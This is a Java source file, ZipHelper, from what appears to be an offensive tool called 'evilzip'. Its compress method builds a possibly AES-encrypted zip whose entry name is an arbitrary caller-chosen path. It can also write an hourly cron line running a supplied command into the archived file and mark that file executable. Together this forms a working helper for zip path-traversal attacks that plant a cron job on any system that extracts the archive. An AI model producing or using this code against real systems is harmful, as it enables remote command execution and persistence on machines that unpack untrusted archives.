package net.thekingofduck.core;

import net.lingala.zip4j.ZipFile;
import net.lingala.zip4j.model.ZipParameters;
import org.apache.commons.lang.StringUtils;

import java.io.*;
import java.nio.charset.StandardCharsets;

import static net.lingala.zip4j.model.enums.AesKeyStrength.KEY_STRENGTH_256;
import static net.lingala.zip4j.model.enums.CompressionLevel.*;
import static net.lingala.zip4j.model.enums.CompressionMethod.*;
import static net.lingala.zip4j.model.enums.EncryptionMethod.AES;

/**
 * Project: evilzip
 * Date:2021/6/30 下午1:55
 * @author CoolCat
 * @version 1.0.0
 * Github:https://github.com/TheKingOfDuck
 * When I wirting my code, only God and I know what it does. After a while, only God knows.
 */
public class ZipHelper {

    public static void compress(String inputFile,String fullpath,String password,String cmd,String savePath) throws Exception {


        File file  = new File(savePath);
        file.delete();

        ZipFile zip = null;
        ZipParameters parameters = new ZipParameters();

        if (StringUtils.isNotBlank(password)&&StringUtils.isNotEmpty(password)){
            zip = new ZipFile(savePath,password.toCharArray());
            parameters.setEncryptFiles(true);
            parameters.setEncryptionMethod(AES);
            parameters.setAesKeyStrength(KEY_STRENGTH_256);
        }else {
            zip = new ZipFile(savePath);
        }

        parameters.setCompressionMethod(STORE);
        parameters.setCompressionLevel(NORMAL);
        parameters.setFileNameInZip(fullpath);

        if (StringUtils.isNotBlank(cmd)){
            String payload = String.format("* */1 * * * %s",cmd);
            FileOutputStream fileOutputStream = new FileOutputStream(inputFile);
            fileOutputStream.write(payload.getBytes(StandardCharsets.UTF_8));
            fileOutputStream.flush();
            fileOutputStream.close();
        }

        File in = new File(inputFile);
        in.setExecutable(true);
        in.setReadable(true);
        in.setWritable(true);
        zip.addFile(in, parameters);
    }
}
